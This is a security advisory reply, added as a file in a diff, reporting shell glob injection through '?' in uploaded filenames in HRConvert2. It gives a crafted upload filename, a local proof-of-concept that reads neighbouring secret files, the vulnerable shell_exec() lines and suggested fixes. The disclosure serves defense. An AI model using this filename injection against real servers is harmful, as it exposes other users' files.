@@ -1,0 +1,125 @@
+Re: [zelon88/HRConvert2] OS Command Injection via Unsanitized File Path in 30+ shell_exec() Calls (GHSA-qcjw-6j35-cq65)
+
+Hi,
+
+Thank you for testing and for your thoughtful response. You're right that trim('-') and the space-to-underscore replacement block the specific filename-based attack I initially described. I appreciate you taking the time to verify that.
+
+However, after further analysis of the current source code (v3.4.7), I've identified a different but related issue that IS reproducible:
+
+=== ISSUE: Shell Glob Injection via ? Character ===
+
+The ? character is NOT filtered by sanitizeString() in strict mode. When a filename containing ? is passed to shell_exec() without escapeshellarg(), bash performs glob expansion, matching unintended files.
+
+=== WHY ? SURVIVES ===
+
+Looking at sanitizeString() (convertCore.php line 67-68):
+
+  str_split('|\\~#[](){};:$!#^&%@>*<"\'/`')
+
+The character blacklist includes * (glob wildcard) but does NOT include ? (single-character glob wildcard). After sanitization:
+
+  Input:  file?.jpg
+  Output: file?.jpg    (? passes through unchanged)
+
+=== ATTACK FLOW ===
+
+1. Attacker uploads a file with ? in the filename:
+   HTTP: Content-Disposition: form-data; name="file"; filename="img?.jpg"
+   
+2. sanitizeString('img?.jpg', TRUE) returns 'img?.jpg' - unchanged.
+   File is stored on disk as: /ConvertDir/img?.jpg
+
+3. Attacker submits conversion request:
+   POST convertSelected[] = img?.jpg
+   POST extension = png
+
+4. verifyFile() passes because PHP's file_exists() does NOT perform glob expansion.
+   The literal file 'img?.jpg' exists on disk, so validation succeeds.
+
+5. shell_exec() is called (convertCore.php line 902):
+   shell_exec('convert -background none /ConvertTempDir/img?.jpg /ConvertDir/output.png')
+
+6. Bash expands the ? glob BEFORE the command executes:
+   convert -background none /ConvertTempDir/img1.jpg /ConvertTempDir/img2.jpg /ConvertTempDir/img3.jpg /ConvertTempDir/img?.jpg /ConvertDir/output.png
+
+7. ImageMagick processes ALL matched files instead of just one.
+
+=== LOCAL REPRODUCTION (no HRConvert2 installation needed) ===
+
+Step 1: Create test environment
+  mkdir -p /tmp/poc && cd /tmp/poc
+  echo "SECRET_1" > fileA.txt
+  echo "SECRET_2" > fileB.txt
+  echo "SECRET_3" > fileC.txt
+  echo "attacker" > "file?.txt"
+
+Step 2: Verify ? survives sanitizeString()
+  php -r "
+  function sanitizeString(\$v, \$s) {
+    if (\$s) \$v = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\\\~#[](){};:\$!#^&%@>*<\"\\'/\`'.chr(9).chr(10).chr(13).chr(0)), '', \$v))))), '-'), ENT_QUOTES, 'UTF-8');
+    return \$v;
+  }
+  echo sanitizeString('file?.txt', TRUE);
+  "
+  Output: file?.txt (? not filtered)
+
+Step 3: Demonstrate glob expansion (the vulnerability)
+  cat /tmp/poc/file?.txt
+  Output: attacker SECRET_1 SECRET_2 SECRET_3 (all 4 files read!)
+
+  cat '/tmp/poc/file?.txt'
+  Output: attacker (only the literal file)
+
+Step 4: Simulate ImageMagick command
+  eval "echo convert -background none /tmp/poc/file?.txt /tmp/poc/output.png"
+  Output: convert -background none /tmp/poc/file?.txt /tmp/poc/fileA.txt /tmp/poc/fileB.txt /tmp/poc/fileC.txt /tmp/poc/output.png
+
+Step 5: Cleanup
+  rm -rf /tmp/poc
+
+=== AFFECTED CODE LOCATIONS ===
+
+Every shell_exec() call that uses unquoted file paths is affected. Examples:
+- Line 644:  clamscan -r $path
+- Line 862:  xpstopdf $pathname $newPathname
+- Line 902:  convert -background none $wh$rotate $pathname $newPathname
+- Line 964:  dia $pathname -e $newPathname
+- Line 995:  ffmpeg -i $pathname ... $newPathname
+- Line 1141: 7z x -aoa $pathname -o$safedir2
+- Line 1947: clamscan -r $ConvertDir.$file
+
+=== IMPACT ===
+
+- Process unintended files in the same session directory
+- If deployment shares directories across users: information disclosure
+- ClamAV scanning unintended files
+- ImageMagick/FFmpeg processing unintended input
+
+=== FIX ===
+
+Add ? to the sanitizeString() character filter:
+
+  str_split('|\\~#[](){};:$!#^&%@>*<"\'/`?')
+                                           ^ add this
+
+Or better, use escapeshellarg() on all variables passed to shell_exec():
+
+  Before: shell_exec('convert '.$pathname.' '.$newPathname);
+  After:  shell_exec('convert '.escapeshellarg($pathname).' '.escapeshellarg($newPathname));
+
+=== ADDITIONAL BUGS FOUND ===
+
+1. Dangling expression (line 892):
+   if (!is_numeric($rotate) or $rotate === FALSE) '-rotate '.$rotate;
+   This is a statement that evaluates an expression but never assigns it.
+   $rotate is never modified regardless of is_numeric() result.
+
+2. Assignment instead of comparison (line ~1086):
+   if ($bitrate = 'auto') $br = ' ';
+   Should be: if ($bitrate == 'auto')
+   This means $bitrate is ALWAYS set to 'auto', breaking the bitrate feature.
+
+Thank you again for your responsiveness. Happy to discuss further.
+
+Best regards,
+cenyuhan0324
